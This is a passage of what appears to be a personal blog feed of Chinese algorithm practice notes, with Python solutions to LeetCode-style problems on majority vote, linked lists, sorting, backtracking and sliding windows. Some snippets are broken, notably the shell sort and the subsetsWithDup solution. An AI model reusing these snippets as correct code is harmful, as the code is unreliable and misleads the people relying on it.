<h1 id="169-多数元素-众数问题，摩根投票法"><a href="#169-多数元素-众数问题，摩根投票法" class="headerlink" title="169. 多数元素__众数问题，摩根投票法"></a><a href="https://leetcode-cn.com/problems/majority-element/" target="_blank" rel="noopener">169. 多数元素</a>__众数问题，摩根投票法</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        res=nums[<span class="number">0</span>]</span><br><span class="line">        cnt=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> num==res: cnt+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>: cnt-=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cnt==<span class="number">0</span>:</span><br><span class="line">                res=num</span><br><span class="line">                cnt=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="牛客高频-链表内指定区间反转"><a href="#牛客高频-链表内指定区间反转" class="headerlink" title="牛客高频-链表内指定区间反转"></a>牛客高频-链表内指定区间反转</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># @param head ListNode类 </span></span><br><span class="line"><span class="comment"># @param m int整型 </span></span><br><span class="line"><span class="comment"># @param n int整型 </span></span><br><span class="line"><span class="comment"># @return ListNode类</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBetween</span><span class="params">(self , head , m , n )</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        dummy=ListNode(<span class="number">0</span>)</span><br><span class="line">        dummy.next=head</span><br><span class="line">        pre=dummy</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(m<span class="number">-1</span>):</span><br><span class="line">            pre=pre.next</span><br><span class="line">        pre2=pre.next</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n-m):</span><br><span class="line">            nextNode=pre2.next</span><br><span class="line">            pre2.next=nextNode.next</span><br><span class="line">            nextNode.next=pre.next</span><br><span class="line">            pre.next=nextNode</span><br><span class="line">        <span class="keyword">return</span> dummy.next</span><br></pre></td></tr></table></figure>



<h1 id="插入-amp-希尔排序-缩小增量排序"><a href="#插入-amp-希尔排序-缩小增量排序" class="headerlink" title="插入&amp;希尔排序(缩小增量排序)"></a>插入&amp;希尔排序(缩小增量排序)</h1><p><a href="https://blog.csdn.net/weixin_37818081/article/details/79202115" target="_blank" rel="noopener">介绍比较完整</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertSort</span><span class="params">(num:[])</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)):</span><br><span class="line">        tmp=num[i]</span><br><span class="line">        j=i<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> j&gt;=<span class="number">0</span> <span class="keyword">and</span> num[j]&gt;tmp:</span><br><span class="line">            num[j+<span class="number">1</span>]=num[j]</span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">        num[j+<span class="number">1</span>]=tmp</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(num:[])</span>-&gt;[]</span></span><br><span class="line"><span class="function">	gap=len(num)//2</span></span><br><span class="line"><span class="function">    while gap&gt;0:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(gap,len(num)):</span><br><span class="line">            tmp=num[i]</span><br><span class="line">            j=i-gap</span><br><span class="line">            <span class="keyword">while</span> j&gt;=<span class="number">0</span> <span class="keyword">and</span> num[j]&gt;num[j+<span class="number">1</span>]:</span><br><span class="line">                num[j+<span class="number">1</span>],num[j]=num[j].num[j+<span class="number">1</span>]</span><br><span class="line">                j+=gap</span><br><span class="line">    <span class="keyword">return</span> num</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 回溯练习</title>
    <url>/2020/08/02/2020-08-02-Backtrace-1/</url>
    <content><![CDATA[<p><a href="https://leetcode-cn.com/problems/subsets/solution/hui-su-suan-fa-by-powcai-5/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/subsets/solution/hui-su-suan-fa-by-powcai-5/</a></p>
<p>上面的题解中，有个题解很有意思，讲了很多回溯的通用类似题</p>
<p>今天：回溯、DP</p>
<p>明天：堆栈、</p>
<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=[]</span><br><span class="line">listTmp=[] <span class="comment">#用于</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(选择列表，路径)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.append(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> 选择列表:</span><br><span class="line">        路径.append(i) <span class="comment">#做选择</span></span><br><span class="line">        bcaktree(选择列表，路径) <span class="comment">#下一轮回溯</span></span><br><span class="line">        路径.pop() <span class="comment">#撤销选择</span></span><br></pre></td></tr></table></figure>

<p>如果需要全排列，我们需要用visited解决</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    visited=&#123;&#125; <span class="comment">#哈希字典，检测是否visited</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,nums,result,listTmp,visited)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(listTmp)==len(nums):</span><br><span class="line">        result.append(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">        ---------------</span><br><span class="line">        <span class="keyword">if</span> visited.get(i): <span class="comment">#可以这样get检测，如果没有就返回None。也可以用 i in dict来判断</span></span><br><span class="line">        <span class="comment"># if i in visited:                </span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ---------------</span><br><span class="line">        listTmp.append(i)</span><br><span class="line">        visited[i]=<span class="literal">True</span></span><br><span class="line">        self.backtrace(nums,result,listTmp,visited)</span><br><span class="line">        ---------------</span><br><span class="line">        visited[i]=<span class="literal">False</span> <span class="comment">#如果上面用 i in dict来判断，这里就要改成dict.pop(i)</span></span><br><span class="line">        <span class="comment"># visited.pop(i)</span></span><br><span class="line">        ---------------</span><br><span class="line">        listTmp.pop()</span><br></pre></td></tr></table></figure>

<p>如果要给的nums有重复元素，要求返回时没有重复的元素</p>
<p>我们需要先sort排列。</p>
<p>然后跳过重复的数；或者直接检测在不在result中（效率可能低）</p>
<p>遇事不决，就用 <code>in</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums.sort() <span class="comment">#需要排序</span></span><br><span class="line">------------------</span><br><span class="line"><span class="keyword">if</span> listTmp <span class="keyword">not</span> <span class="keyword">in</span> result:  <span class="comment">#方法1，直接检测在不在result中。</span></span><br><span class="line">    result.append(copy.copy(listTmp)) <span class="comment">#方法1</span></span><br><span class="line">------------------</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(pos,len(nums)): </span><br><span class="line">    <span class="keyword">if</span> i!=pos <span class="keyword">and</span> nums[i]==nums[i<span class="number">-1</span>]: <span class="comment">#方法2，跳过相同的数</span></span><br><span class="line">        <span class="keyword">continue</span>   方法<span class="number">2</span></span><br></pre></td></tr></table></figure>



<h1 id="求子集"><a href="#求子集" class="headerlink" title="求子集"></a>求子集</h1><p>给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=[]</span><br><span class="line">        self.backtrace(nums,<span class="number">0</span>,listTmp,result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,nums,pos,listTmp,result)</span>:</span></span><br><span class="line">        result.append(copy.copy(listTmp))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(pos,len(nums)):</span><br><span class="line">            listTmp.append(nums[i])</span><br><span class="line">            self.backtrace(nums,i+<span class="number">1</span>,listTmp,result)</span><br><span class="line">            listTmp.pop()</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h1 id="求子集-ii-去重复"><a href="#求子集-ii-去重复" class="headerlink" title="求子集-ii 去重复"></a>求子集-ii 去重复</h1><p>重点是在上一个的基础上</p>
<ul>
<li>对nums排序</li>
<li>或检测是否存在于result，或跳过相同的数（开销可能小）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subsetsWithDup</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=[]</span><br><span class="line">        nums.sort() <span class="comment">#需要排序</span></span><br><span class="line">        self.backtrace(nums,<span class="number">0</span>,result,listTmp)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,nums,pos,result,lista)</span>:</span></span><br><span class="line">        <span class="comment"># if listTmp not in result:  #方法1，直接检测在不在result中</span></span><br><span class="line">        <span class="comment">#    result.append(copy.copy(listTmp)) #方法1</span></span><br><span class="line"></span><br><span class="line">        result.append(copy.copy(listTmp))  <span class="comment">#方法2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(pos,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> i!=pos <span class="keyword">and</span> nums[i]==nums[i<span class="number">-1</span>]: <span class="comment">#方法2，跳过相同的数</span></span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            listTmp.append(nums[i])</span><br><span class="line">            self.backtrace(nums,i+<span class="number">1</span>,result,listTmp)</span><br><span class="line">            listTmp.pop()</span><br></pre></td></tr></table></figure>

<h1 id="求全排列"><a href="#求全排列" class="headerlink" title="求全排列"></a>求全排列</h1><p>可以用数组就不要用字典了，性能不好</p>
<p>主要是要有一个 <code>visited</code> 数组\哈希字典 来保存已经加入的数，然后大胆遍历就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=[]</span><br><span class="line">        visited=&#123;&#125; <span class="comment">#哈希字典，检测是否visited</span></span><br><span class="line">        self.backtrace(nums,result,listTmp,visited)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,nums,result,listTmp,visited)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(listTmp)==len(nums): <span class="comment">#长度相等就返回</span></span><br><span class="line">            result.append(copy.copy(listTmp))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> visited.get(i): <span class="comment">#可以这样get检测，如果没有就返回None。也可以用 i in dict来判断</span></span><br><span class="line">            <span class="comment"># if i in visited:                </span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            listTmp.append(i)</span><br><span class="line">            visited[i]=<span class="literal">True</span></span><br><span class="line">            self.backtrace(nums,result,listTmp,visited)</span><br><span class="line">            visited[i]=<span class="literal">False</span> <span class="comment">#如果上面用 i in dict来判断，这里就要改成dict.pop(i)</span></span><br><span class="line">            <span class="comment"># visited.pop(i)</span></span><br><span class="line">            listTmp.pop()</span><br></pre></td></tr></table></figure>

<h1 id="求全排列-ii-去重复"><a href="#求全排列-ii-去重复" class="headerlink" title="求全排列-ii 去重复"></a>求全排列-ii 去重复</h1><p><a href="https://leetcode-cn.com/problems/permutations-ii/" target="_blank" rel="noopener">全排列-ii</a></p>
<p>给定一个可包含重复数字的序列，返回所有不重复的全排列。</p>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,1,2]</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  [1,1,2],</span><br><span class="line">  [1,2,1],</span><br><span class="line">  [2,1,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>方法1，加上 and listTmp not in result</li>
<li>方法2，当上一个元素和当前元素相同，而上一个元素未visited，</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permuteUnique</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=[]</span><br><span class="line">        visited=[<span class="literal">False</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        nums.sort() <span class="comment">#排序是为了</span></span><br><span class="line">        self.backtrace(nums,result,listTmp,visited)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,nums,result,listTmp,visited)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(listTmp)==len(nums): <span class="comment">#方法1，这里加上 and listTmp not in result</span></span><br><span class="line">            result.append(copy.copy(listTmp))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> visited[i]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#方法2，当上一个元素和当前元素相同，而上一个元素未visited，（剪枝）</span></span><br><span class="line">            <span class="comment">#说米上一个元素已经作为当前位置遍历过了</span></span><br><span class="line">            <span class="comment">#当前的元素不能选择了，会引发冲突</span></span><br><span class="line">            <span class="comment">#因为上个元素已经选了它产生了结果了，现在又选就会产生冲突</span></span><br><span class="line">            <span class="keyword">if</span> i!=<span class="number">0</span> <span class="keyword">and</span> nums[i]==nums[i<span class="number">-1</span>] <span class="keyword">and</span> visited[i<span class="number">-1</span>]==<span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            visited[i]=<span class="literal">True</span></span><br><span class="line">            listTmp.append(nums[i])</span><br><span class="line">            self.backtrace(nums,result,listTmp,visited)</span><br><span class="line">            listTmp.pop()</span><br><span class="line">            visited[i]=<span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h1 id="剑指-全排列字符串"><a href="#剑指-全排列字符串" class="headerlink" title="剑指-全排列字符串"></a>剑指-全排列字符串</h1><p>下面是我写的思路比较清晰的 <code>visited</code> 回溯写法</p>
<p>由于字符串不能排序，所以只能用 <code>listTmp not in result</code> 来判断，明显效率低了很多。</p>
<p>最后 <strong>47 / 52</strong> 个通过测试用例 ，就超时了，所以还是借鉴网上老哥的清爽写法吧。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(self, s: str)</span> -&gt; List[str]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">return</span> []</span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=<span class="string">""</span></span><br><span class="line">        visited=[<span class="literal">False</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line">        self.backtrace(s,result,listTmp,visited)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self,s,result,listTmp,visited)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(listTmp)==len(s) <span class="keyword">and</span> listTmp <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            result.append(copy.copy(listTmp))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="keyword">if</span> visited[i]: </span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            visited[i]=<span class="literal">True</span></span><br><span class="line">            listTmp+=s[i]</span><br><span class="line">            self.backtrace(s,result,listTmp,visited)</span><br><span class="line">            listTmp=listTmp[:<span class="number">-1</span>]</span><br><span class="line">            visited[i]=<span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>这个 <code>DFS</code> 有剪枝，所以时间复杂度还过的过去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(self, s: str)</span> -&gt; List[str]:</span></span><br><span class="line">        result,c=[],list(s)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(x)</span>:</span> <span class="comment">#遍历第x位的固定</span></span><br><span class="line">            <span class="keyword">if</span> x==len(c)<span class="number">-1</span>: <span class="comment">#如果遍历到倒数第二位，最后一位其实也固定了</span></span><br><span class="line">                result.append(<span class="string">""</span>.join(c)) </span><br><span class="line">            <span class="comment"># setA=set()</span></span><br><span class="line">            setA=dict()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(c)):</span><br><span class="line">                <span class="keyword">if</span> c[i] <span class="keyword">in</span> setA: <span class="keyword">continue</span> <span class="comment">#如果值已经固定过了，剪枝</span></span><br><span class="line">                setA[c[i]]=<span class="number">1</span> <span class="comment">#添加</span></span><br><span class="line">                c[i],c[x]=c[x],c[i] <span class="comment">#把i的值固定到第x位上</span></span><br><span class="line">                dfs(x+<span class="number">1</span>) <span class="comment">#遍历下一位</span></span><br><span class="line">                c[i],c[x]=c[x],c[i] <span class="comment">#换回</span></span><br><span class="line">        dfs(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h1 id="组合总和"><a href="#组合总和" class="headerlink" title="组合总和"></a>组合总和</h1><p><a href="https://leetcode-cn.com/problems/combination-sum/" target="_blank" rel="noopener">组合总和</a></p>
<p>给定一个无重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。</p>
<p>candidates 中的数字可以无限制重复被选取。</p>
<p>说明：</p>
<p>所有数字（包括 target）都是正整数。<br>解集不能包含重复的组合。 </p>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candidates &#x3D; [2,3,6,7], target &#x3D; 7,</span><br><span class="line">所求解集为：</span><br><span class="line">[</span><br><span class="line">  [7],</span><br><span class="line">  [2,2,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<p>示例 2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candidates &#x3D; [2,3,5], target &#x3D; 8,</span><br><span class="line">所求解集为：</span><br><span class="line">[</span><br><span class="line">  [2,2,2,2],</span><br><span class="line">  [2,3,3],</span><br><span class="line">  [3,5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">combinationSum</span><span class="params">(self, candidates: List[int], target: int)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        size=len(candidates)</span><br><span class="line">        <span class="keyword">if</span> size==<span class="number">0</span>: <span class="keyword">return</span> []        </span><br><span class="line">        <span class="comment"># result=listTmp=[] #这是不能的，引用一样了！！！</span></span><br><span class="line">        result=[]</span><br><span class="line">        listTmp=[]</span><br><span class="line">        candidates.sort()</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(target,listTmp,begin)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> target==<span class="number">0</span>:</span><br><span class="line">                <span class="comment"># print(listTmp)</span></span><br><span class="line">                result.append(listTmp.copy()) <span class="comment">#listTmp[:] == copy.copy(listTmp)</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> range(begin, size):</span><br><span class="line">                residue=target-candidates[index]</span><br><span class="line">                <span class="comment"># 剪枝，不必递归到下一层，并且后面的分支也不必执行</span></span><br><span class="line">                <span class="comment"># 因为后面的指定会大于当前的值，没必要计算了</span></span><br><span class="line">                <span class="keyword">if</span> residue&lt;<span class="number">0</span>: <span class="keyword">break</span> </span><br><span class="line">                listTmp.append(candidates[index]) </span><br><span class="line">                <span class="comment"># 因为下一层不能比上一层还小，起始索引还从 index 开始</span></span><br><span class="line">                <span class="comment"># 防止出现重复的答案</span></span><br><span class="line">                dfs(residue,listTmp,index) </span><br><span class="line">                listTmp.pop()</span><br><span class="line">        dfs(target,listTmp,<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># self.__dfs(candidates,0,size,listTmp,result,target)</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h1 id="打印从1到最大的n位数"><a href="#打印从1到最大的n位数" class="headerlink" title="打印从1到最大的n位数"></a>打印从1到最大的n位数</h1><p><a href="https://leetcode-cn.com/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/" target="_blank" rel="noopener">剑指 Offer 17. 打印从1到最大的n位数</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printNumbers</span><span class="params">(self, n: int)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">return</span> [] <span class="keyword">if</span> n==<span class="number">0</span> <span class="keyword">else</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>**n)]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 滑动窗口练习</title>
    <url>/2020/08/02/2020-08-02-Sliding-Window-1/</url>
    <content><![CDATA[<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 滑动窗口算法框架 */</span></span><br><span class="line">void slidingWindow(<span class="keyword">string</span> s, <span class="keyword">string</span> t) &#123;</span><br><span class="line">    unordered_map&lt;char, <span class="keyword">int</span>&gt; need, window;</span><br><span class="line">    <span class="keyword">for</span> (char c : t) need[c]++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">    while (right &lt; s.size()) &#123;</span><br><span class="line">        <span class="comment">// c 是将移入窗口的字符</span></span><br><span class="line">        char c = s[right];</span><br><span class="line">        <span class="comment">// 右移窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*** debug 输出的位置 ***/</span></span><br><span class="line">        printf(<span class="string">"window: [%d, %d)\n"</span>, left, right);</span><br><span class="line">        <span class="comment">/********************/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断左侧窗口是否要收缩</span></span><br><span class="line">        while (window needs shrink) &#123;</span><br><span class="line">            <span class="comment">// d 是将移出窗口的字符</span></span><br><span class="line">            char d = s[left];</span><br><span class="line">            <span class="comment">// 左移窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要变化的地方</p>
<ul>
<li>1、右指针右移之后窗口数据更新</li>
<li>2、判断窗口是否要收缩</li>
<li>3、左指针右移之后窗口数据更新</li>
<li>4、根据题意计算结果</li>
</ul>
<h1 id="最大不重复字符串"><a href="#最大不重复字符串" class="headerlink" title="最大不重复字符串"></a>最大不重复字符串</h1><p>使用queue来模拟滑动窗口</p>
<h1 id="最小覆盖子串"><a href="#最小覆盖子串" class="headerlink" title="最小覆盖子串"></a>最小覆盖子串</h1><p><a href="https://leetcode-cn.com/problems/minimum-window-substring/" target="_blank" rel="noopener">最小覆盖子串</a></p>
<p>用need收集字符</p>
<p>用win收集窗口内字符</p>
<p>用match==len(need)判断每类字符是否满足t串的需求</p>
<p>用win[c]==need[c]来找最小的满足窗口</p>
<p>用right-left&lt;minLen来更新最小窗口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minWindow</span><span class="params">(self, s: str, t: str)</span> -&gt; str:</span></span><br><span class="line">        win=&#123;&#125;</span><br><span class="line">        need=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> t: </span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> need: need[i]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>: need[i]=<span class="number">1</span></span><br><span class="line">        left=right=<span class="number">0</span></span><br><span class="line">        start=end=<span class="number">0</span> <span class="comment">#当前匹配成功的窗口范围</span></span><br><span class="line">        match=<span class="number">0</span> <span class="comment">#字符匹配的次数</span></span><br><span class="line">        minLen=sys.maxsize <span class="comment">#最大值</span></span><br><span class="line">        c=<span class="string">""</span> <span class="comment">#字符串</span></span><br><span class="line">        <span class="keyword">while</span> right&lt;len(s):</span><br><span class="line">            c=s[right]</span><br><span class="line">            right+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> need: <span class="comment">#如果这个字符在need中</span></span><br><span class="line">                <span class="keyword">if</span> c <span class="keyword">in</span> win: win[c]+=<span class="number">1</span> <span class="comment">#win[c]加一</span></span><br><span class="line">                <span class="keyword">else</span>: win[c]=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> win[c]==need[c]: </span><br><span class="line">                    match+=<span class="number">1</span> <span class="comment">#如果win中的这个c字符数量与need中一样，</span></span><br><span class="line">                             <span class="comment">#就匹配成功一个字符（超出小于都不加一）</span></span><br><span class="line">            <span class="keyword">while</span> match==len(need): <span class="comment">#如果match的字符种数等同于need中字符种数</span></span><br><span class="line">                <span class="keyword">if</span> right-left&lt;minLen:  <span class="comment">#最小长度的更新</span></span><br><span class="line">                    minLen=right-left</span><br><span class="line">                    start=left</span><br><span class="line">                    end=right</span><br><span class="line">                c=s[left] <span class="comment">#这是取left所指的字符</span></span><br><span class="line">                left+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> c <span class="keyword">in</span> need: <span class="comment">#如果当前字符属于need中，、并且退处</span></span><br><span class="line">                    <span class="keyword">if</span> win[c]==need[c]:  <span class="comment">#如果当前字符的数量相同，将match减一（关闭匹配）</span></span><br><span class="line">                        match-=<span class="number">1</span></span><br><span class="line">                    win[c]-=<span class="number">1</span> <span class="comment">#left移动了，减少当前字符，不管match减不减，这里都要过一个字符</span></span><br><span class="line">        <span class="keyword">if</span> minLen==sys.maxsize: <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        <span class="keyword">return</span> s[start:end]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 二进制练习</title>
    <url>/2020/08/02/2020-08-02-Binary-1/</url>
    <content><![CDATA[<p><a href="http://graphics.stanford.edu/~seander/bithacks.html#OperationCounting" target="_blank" rel="noopener">位运算总结</a></p>
<h1 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h1><p><strong>加法非进位</strong></p>
<p>n=a^b</p>
<p><strong>加法进位</strong></p>
<p>c=a&amp;b</p>
